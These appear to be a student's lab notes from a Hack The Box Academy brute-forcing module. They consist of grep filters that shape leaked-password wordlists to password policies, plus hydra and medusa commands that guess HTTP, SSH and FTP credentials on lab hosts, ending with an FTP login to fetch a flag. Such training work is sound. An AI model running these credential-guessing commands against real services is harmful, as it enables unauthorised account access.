```
theo854@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```

at least 8 characters
```
grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
```

at least one upercase
```
theo854@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```
one lowercase
```
theo854@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```
one number
```
theo854@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

hydra https://academy.hackthebox.com/app/module/57/section/504

```
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.70 http-get / -s 32118

```


```
theo854@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
theo854@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```



```
theo854@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

```

```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.82 -s 30593  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

```

Medusa
https://academy.hackthebox.com/app/module/57/section/512

find the ssh user to connect to the server
```
medusa -h 154.57.164.73 -n 32692 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

```

make sure to check all the files including /etc/passwd and see the users 
find the ftp user s password 
```
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

connect to the ftp server and retreive the flag
```
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```
use get flag.txt


```
theo854@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

custom wordlists https://academy.hackthebox.com/app/module/57/section/3209
